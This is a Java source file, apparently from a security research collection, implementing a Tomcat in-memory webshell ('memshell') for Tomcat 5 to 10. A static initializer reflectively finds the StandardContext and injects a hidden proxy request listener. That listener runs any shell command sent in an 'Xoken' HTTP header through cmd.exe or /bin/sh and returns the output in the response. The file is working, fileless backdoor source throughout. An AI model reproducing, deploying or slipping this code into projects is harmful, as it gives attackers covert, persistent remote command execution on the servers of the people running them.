package com.demo.memshell.all;

import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.*;

/**
 * @author Whoopsunix
 * <p>
 * 5-10 全版本
 */
public class TomcatExecThreadListener implements InvocationHandler {

    private static String HEADER = "Xoken";
    private static Object[] applicationEventListenersObjects;
    private static List applicationEventListeners;
    private static Boolean flag = false;


    public TomcatExecThreadListener() {
    }

    static {
        try {
            // 动态代理兼容 javax jakarta
            Class servletRequestListenerClass = null;
            try {
                servletRequestListenerClass = Class.forName("jakarta.servlet.ServletRequestListener");
            } catch (Exception e) {
                try {
                    servletRequestListenerClass = Class.forName("javax.servlet.ServletRequestListener");
                } catch (ClassNotFoundException ex) {

                }
            }

            Object object = Proxy.newProxyInstance(servletRequestListenerClass.getClassLoader(), new Class[]{servletRequestListenerClass}, new TomcatExecThreadListener());

            // 获取 standardContext
            Object standardContext = getTargetObject("org.apache.catalina.core.StandardContext");
            if (!flag && !isInject(standardContext, object)) {
                inject(standardContext, object);
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static boolean isInject(Object standardContext, Object object) {
        try {
            try {
                applicationEventListeners = (List) getFieldValue(standardContext, "applicationEventListenersList");
                for (int i = 0; i < applicationEventListeners.size(); i++) {
                    if (applicationEventListeners.get(i).getClass().getName().contains(object.getClass().getName())) {
                        return true;
                    }
                }
            } catch (Exception e) {

            }

            try {
                applicationEventListenersObjects = (Object[]) getFieldValue(standardContext, "applicationEventListenersObjects");
                for (int i = 0; i < applicationEventListenersObjects.length; i++) {
                    Object applicationEventListenersObject = applicationEventListenersObjects[i];
                    if (applicationEventListenersObject instanceof Proxy && object instanceof Proxy) {
                        Object h = getFieldValue(applicationEventListenersObject, "h");
                        Object h2 = getFieldValue(object, "h");
                        if (h.getClass().getName().contains(h2.getClass().getName())) {
                            return true;
                        }
                    } else {
                        if (applicationEventListenersObject.getClass().getName().contains(object.getClass().getName())) {
                            return true;
                        }
                    }
                }
            } catch (Exception e) {

            }

        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }

    public static void inject(Object standardContext, Object object) {
        try {
            if (applicationEventListenersObjects != null) {
                // 5 6
                Object[] newApplicationEventListenersObjects = new Object[applicationEventListenersObjects.length + 1];
                System.arraycopy(applicationEventListenersObjects, 0, newApplicationEventListenersObjects, 0, applicationEventListenersObjects.length);
                newApplicationEventListenersObjects[newApplicationEventListenersObjects.length - 1] = object;
                setFieldValue(standardContext, "applicationEventListenersObjects", newApplicationEventListenersObjects);
            } else {
                // 7 8 9 10
                invokeMethod(standardContext, "addApplicationEventListener", new Class[]{Object.class}, new Object[]{object});
            }
            flag = true;

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        Method method;
        try {
            method = obj.getClass().getDeclaredMethod(methodName, argsClass);
        } catch (NoSuchMethodException e) {
            method = obj.getClass().getSuperclass().getDeclaredMethod(methodName, argsClass);
        }
        method.setAccessible(true);
        Object object = method.invoke(obj, args);
        return object;
    }

    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        if (method.getName().equals("requestInitialized")) {
            exec(args[0]);
        }
        return null;
    }

    public static Object getTargetObject(String className) throws Exception {
        List<ClassLoader> activeClassLoaders = new TomcatExecThreadListener().getActiveClassLoaders();

        Class cls = getTargetClass(className, activeClassLoaders);

        // 死亡区域 已检查过的类
        HashSet breakObject = new HashSet();
        breakObject.add(System.identityHashCode(breakObject));

        // 原始类型和包装类都不递归
        HashSet<String> breakType = new HashSet<>(Arrays.asList(int.class.getName(), short.class.getName(), long.class.getName(), double.class.getName(), byte.class.getName(), float.class.getName(), char.class.getName(), boolean.class.getName(), Integer.class.getName(), Short.class.getName(), Long.class.getName(), Double.class.getName(), Byte.class.getName(), Float.class.getName(), Character.class.getName(), Boolean.class.getName(), String.class.getName()));

        Object result = getTargetObject(cls, Thread.currentThread(), breakObject, breakType, 30);

        return result;
    }

    /**
     * 遍历 ClassLoader 加载目标 Class
     */
    public static Class getTargetClass(String className, List<ClassLoader> activeClassLoaders) {
        for (ClassLoader activeClassLoader : activeClassLoaders) {
            try {
                return Class.forName(className, true, activeClassLoader);
            } catch (Throwable e) {

            }
        }
        return null;
    }

    public List<ClassLoader> getActiveClassLoaders() throws Exception {
//        List<ClassLoader> activeClassLoaders = new ArrayList<>();
        Set<ClassLoader> activeClassLoaders = new HashSet<>();

        // 加载当前对象的加载器
        activeClassLoaders.add(this.getClass().getClassLoader());

        // 当前线程的上下文类加载器
        activeClassLoaders.add(Thread.currentThread().getContextClassLoader());

//        // 应用程序类加载器
//        ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();
//        activeClassLoaders.add(systemClassLoader);
//
//        // 扩展类加载器
//        activeClassLoaders.add(systemClassLoader.getParent());

        // 获取线程组
        ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
        Thread[] threads = new Thread[threadGroup.activeCount()];
        int count = threadGroup.enumerate(threads, true);
        for (int i = 0; i < count; i++) {
            activeClassLoaders.add(threads[i].getContextClassLoader());
        }

        return new ArrayList<>(activeClassLoaders);
    }

    /**
     * 递归查找
     */
    public static Object getTargetObject(Class targetCls, Object object, HashSet breakObject, HashSet<String> breakType, int maxDepth) {
        // 最大递归深度
        maxDepth--;
        if (maxDepth < 0) {
            return null;
        }

        if (object == null) {
            return null;
        }

        // 寻找到指定类返回
        if (targetCls.isInstance(object)) {
            return object;
        }

        // 获取内存地址，来标识唯一对象
        Integer hash = System.identityHashCode(object);

        if (breakObject.contains(hash)) {
            return null;
        }
        breakObject.add(hash);

        // 获取对象所有 Field
        Field[] fields = object.getClass().getDeclaredFields();
        ArrayList fieldsArray = new ArrayList();
        Class objClass = object.getClass();
        while (objClass != null) {
            Field[] superFields = objClass.getDeclaredFields();
            fieldsArray.addAll(Arrays.asList(superFields));
            objClass = objClass.getSuperclass();
        }
        fields = (Field[]) fieldsArray.toArray(new Field[0]);


        for (Field field : fields) {
            try {
                Class type = field.getType();

                if (breakType.contains(type.getName())) {
                    continue;
                }

                // 获取 Field 值
                field.setAccessible(true);
                Object value = field.get(object);
                Object result = null;

                // 递归查找
                if (value instanceof Map) {
                    // Map 的 kv 都要遍历
                    Map map = (Map) value;
                    for (Object o : map.entrySet()) {
                        Map.Entry entry = (Map.Entry) o;
                        result = getTargetObject(targetCls, entry.getKey(), breakObject, breakType, maxDepth);
                        if (result != null) {
                            break;
                        }
                        result = getTargetObject(targetCls, entry.getValue(), breakObject, breakType, maxDepth);
                        if (result != null) {
                            break;
                        }
                    }
                } else if (value instanceof Iterable) {
                    // 集合的元素都要遍历
                    Iterable iterable = (Iterable) value;
                    for (Object o : iterable) {
                        result = getTargetObject(targetCls, o, breakObject, breakType, maxDepth);
                        if (result != null) {
                            break;
                        }
                    }
                } else if (type.isArray()) {
                    // 数组的元素都要遍历
                    Object[] array = (Object[]) value;
                    for (Object o : array) {
                        result = getTargetObject(targetCls, o, breakObject, breakType, maxDepth);
                        if (result != null) {
                            break;
                        }
                    }
                } else {
                    result = getTargetObject(targetCls, value, breakObject, breakType, maxDepth);
                }

                if (result != null) {
                    return result;
                }
            } catch (Throwable e) {

            }
        }

        return null;
    }


    /**
     * 内存马
     */
    private void exec(Object sre) {
        try {
            try {
                Object httpServletRequest = invokeMethod(sre, "getServletRequest", new Class[]{}, new Object[]{});
                String cmd = (String) invokeMethod(httpServletRequest, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
                if (cmd == null) {
                    return;
                }
                String result = exec(cmd);
                Object response = getResponse(httpServletRequest);
                Object writer = invokeMethod(response, "getWriter", new Class[]{}, new Object[]{});
                invokeMethod(writer, "println", new Class[]{String.class}, new Object[]{result});
//                response.getWriter().println(result);
            } catch (Exception e) {
            }

        } catch (Throwable ignored) {

        }
    }

    public Object getResponse(Object httpServletRequest) {
        Object httpServletResponse = null;
        try {
            Object request = getFieldValue(httpServletRequest, "request");
            httpServletResponse = getFieldValue(request, "response");
        } catch (Exception e) {

        }
        return httpServletResponse;
    }

    public static String exec(String str) {
        try {
            String[] cmd = null;
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                cmd = new String[]{"cmd.exe", "/c", str};
            } else {
                cmd = new String[]{"/bin/sh", "-c", str};
            }
            if (cmd != null) {
                InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
                String execresult = exec_result(inputStream);
                return execresult;
            }
        } catch (Exception e) {

        }
        return "";
    }

    public static String exec_result(InputStream inputStream) {
        try {
            byte[] bytes = new byte[1024];
            int len = 0;
            StringBuilder stringBuilder = new StringBuilder();
            while ((len = inputStream.read(bytes)) != -1) {
                stringBuilder.append(new String(bytes, 0, len));
            }
            return stringBuilder.toString();
        } catch (Exception e) {
            return "";
        }
    }
}
